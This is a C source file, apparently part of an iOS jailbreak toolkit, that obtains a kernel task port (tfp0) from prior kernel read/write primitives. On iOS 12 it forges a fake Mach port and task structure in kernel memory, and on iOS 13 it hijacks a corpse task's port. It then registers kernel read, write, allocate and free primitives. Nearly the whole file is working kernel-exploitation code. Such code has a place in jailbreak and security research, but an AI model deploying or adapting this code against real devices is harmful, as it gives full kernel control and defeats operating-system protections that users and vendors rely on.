#include "tfp0.h"
#include "libprejailbreak.h"
#include "offsets.h"
#include "utils.h"
#include "exploit.h"

#include <mach/mach.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/port.h>
#include <mach/vm_page_size.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);

#define IO_BITS_ACTIVE              0x80000000
#define IKOT_TASK                   0x00000002
#define WQT_QUEUE                   0x00000002
#define EVENT_MASK_BITS             0x00000019

typedef struct {
    int fd[2];
    void *user_buffer;
    uint64_t kern_buffer;
    size_t size;
} pipe_info_t;

union waitq_flags {
    struct {
        uint32_t waitq_type:2;
        uint32_t waitq_fifo:1;
        uint32_t waitq_prepost:1;
        uint32_t waitq_irq:1;
        uint32_t waitq_isvalid:1;
        uint32_t waitq_turnstile_or_port:1;
        uint32_t waitq_eventmask:EVENT_MASK_BITS;
    };
    uint32_t flags;
};

typedef struct {
    union {
        uint64_t data;
        uint64_t tag;
    };
    union {
        struct {
            uint16_t waiters;
            uint8_t pri;
            uint8_t type;
        };
        struct {
            uint64_t ptr;
        };
    };
} lck_mtx_t;

typedef struct {
    lck_mtx_t lock;
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t vtimers;
    uint64_t map;
} ktask_t;

typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock;
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

pipe_info_t *kalloc_via_pipe(size_t size) {
    pipe_info_t *info = calloc(1, sizeof(pipe_info_t));
    info->user_buffer = calloc(1, size);
    info->size = size;
    pipe(info->fd);

    write(info->fd[1], info->user_buffer, size);
    read(info->fd[0], info->user_buffer, size);

    uint64_t fd = kread_ptr(proc_self() + koffsetof(proc, fd));
    uint64_t ofiles = kread_ptr(fd);
    uint64_t fileproc = kread_ptr(ofiles + info->fd[0] * 8);
    uint64_t fileglob = kread_ptr(fileproc + 0x8);
    uint64_t data = kread_ptr(fileglob + 0x38);
    info->kern_buffer = kread_ptr(data + 0x10);
    return info;
}

void kfree_via_pipe(pipe_info_t *info) {
    close(info->fd[0]);
    close(info->fd[1]);
    free(info->user_buffer);
    free(info);
}

mach_port_t create_port(void) {
    mach_port_t port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    return port;
}

int mach_port_waitq_flags(void) {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

mach_port_t tfp0 = MACH_PORT_NULL;

uint64_t kalloc_tfp0(size_t size) {
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return address;
}

void kfree_tfp0(uint64_t address, size_t size) {
    mach_vm_deallocate(tfp0, address, size);
}

int kread_tfp0(uint64_t va, void *buffer, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, va + offset, chunk, (mach_vm_address_t)buffer + offset, &sz);
        if (rv != 0) return -1;
        offset += sz;
    }
    return 0;
}

int kwrite_tfp0(uint64_t va, void *buffer, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, va + offset, (mach_vm_offset_t)buffer + offset, (int)chunk);
        if (rv != 0) return -1;
        offset += chunk;
    }
    return 0;
}

uint8_t kread8_tfp0(uint64_t va) {
    uint8_t val = 0;
    kread_tfp0(va, &val, sizeof(val));
    return val;
}

uint16_t kread16_tfp0(uint64_t va) {
    uint16_t val = 0;
    kread_tfp0(va, &val, sizeof(val));
    return val;
}

uint32_t kread32_tfp0(uint64_t va) {
    uint32_t val = 0;
    kread_tfp0(va, &val, sizeof(val));
    return val;
}

uint64_t kread64_tfp0(uint64_t va) {
    uint64_t val = 0;
    kread_tfp0(va, &val, sizeof(val));
    return val;
}

int kwrite8_tfp0(uint64_t va, uint8_t val) {
    return kwrite_tfp0(va, &val, sizeof(val));
}

int kwrite16_tfp0(uint64_t va, uint16_t val) {
    return kwrite_tfp0(va, &val, sizeof(val));
}

int kwrite32_tfp0(uint64_t va, uint32_t val) {
    return kwrite_tfp0(va, &val, sizeof(val));
}

int kwrite64_tfp0(uint64_t va, uint64_t val) {
    return kwrite_tfp0(va, &val, sizeof(val));
}

int tfp0_init(void) {
    if (gOffsets.major == MAJOR(12)) {

        // Create a fake port and fake task
        mach_port_t fakePort = create_port();
        pipe_info_t *fakePipeAlloc = kalloc_via_pipe(0x1000);
        uint64_t fakePortKaddr = task_get_ipc_port(task_self(), fakePort);
        uint64_t fakeTask = fakePipeAlloc->kern_buffer;
        kport_t *fakePortUaddr = (kport_t *)calloc(1, 0x1000);
        ktask_t *fakeTaskUaddr = (ktask_t *)(fakePortUaddr + 1);

        // Construct a fake port and fake task to use for tfp0
        fakePortUaddr->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
        fakePortUaddr->ip_references = 0x4141;
        fakePortUaddr->ip_lock.type = 0x11;
        fakePortUaddr->ip_messages.port.receiver_name = 1;
        fakePortUaddr->ip_messages.port.msgcount = 0;
        fakePortUaddr->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
        fakePortUaddr->ip_messages.port.waitq.flags = mach_port_waitq_flags();
        fakePortUaddr->ip_kobject = fakeTask;
        fakePortUaddr->ip_srights = 99;
        fakePortUaddr->ip_receiver = kread_ptr(task_get_ipc_port(task_self(), mach_task_self()) + koffsetof(ipc_port, receiver)); // Kernel itk_space

        fakeTaskUaddr->lock.data = 0;
        fakeTaskUaddr->lock.type = 0x22;
        fakeTaskUaddr->ref_count = 99;
        fakeTaskUaddr->active = 1;
        fakeTaskUaddr->map = kinfo(vm_map);
        kwrite64(fakeTask + koffsetof(task, itk_self), 1);

        kwritebuf(fakePortKaddr, fakePortUaddr, sizeof(kport_t));
        kwritebuf(fakeTask, fakeTaskUaddr, sizeof(ktask_t));

        tfp0 = fakePort;
        kernel_rw_deinit();

        uint64_t newFakeTask = kalloc_tfp0(0x600);
        kwrite_tfp0(newFakeTask, fakeTaskUaddr, sizeof(ktask_t));
        fakePortUaddr->ip_kobject = newFakeTask;
        kwrite_tfp0(fakePortKaddr, fakePortUaddr, sizeof(kport_t));
        kfree_via_pipe(fakePipeAlloc);

    } else if (gOffsets.major == MAJOR(13)) {

        mach_port_t corpse = MACH_PORT_NULL;
        task_generate_corpse(mach_task_self(), &corpse);
        uint64_t corpse_port_addr = task_get_ipc_port(task_self(), corpse);
        uint64_t corpse_task_addr = kread_ptr(corpse_port_addr + koffsetof(ipc_port, kobject));

        kwrite64(corpse_port_addr + koffsetof(ipc_port, references), 0x4141);
        kwrite64(corpse_port_addr + koffsetof(ipc_port, srights), 0x4141);
        kwrite64(corpse_task_addr + koffsetof(task, vm_map), kinfo(vm_map));
        kwrite64(corpse_task_addr + koffsetof(task, ref_count), 99);
        kwrite64(corpse_task_addr + koffsetof(task, message_app_suspended), 1);
        kwrite64(corpse_task_addr + koffsetof(task, active), 1);
        kwrite64(corpse_task_addr + koffsetof(task, flags), 0);

        tfp0 = corpse;
        kernel_rw_deinit();

        uint64_t itk_space = kread_ptr(task_self() + koffsetof(task, itk_space));
        uint64_t is_table = kread_ptr(itk_space + koffsetof(ipc_space, table));
        
        kwrite32(is_table + ((corpse >> 8) * 0x18) + 8, 0);
        kwrite64(is_table + ((corpse >> 8) * 0x18), 0);

    } else {
        printf("ERROR: tfp0 is not supported on iOS %d.\n", gOffsets.major - 6);
        return -1;
    }

    gPrimitives.kread8 = kread8_tfp0;
    gPrimitives.kread16 = kread16_tfp0;
    gPrimitives.kread32 = kread32_tfp0;
    gPrimitives.kread64 = kread64_tfp0;
    gPrimitives.kwrite8 = kwrite8_tfp0;
    gPrimitives.kwrite16 = kwrite16_tfp0;
    gPrimitives.kwrite32 = kwrite32_tfp0;
    gPrimitives.kwrite64 = kwrite64_tfp0;
    gPrimitives.kreadbuf = kread_tfp0;
    gPrimitives.kwritebuf = kwrite_tfp0;
    gPrimitives.kalloc = kalloc_tfp0;
    gPrimitives.kfree = kfree_tfp0;

    return 0;
}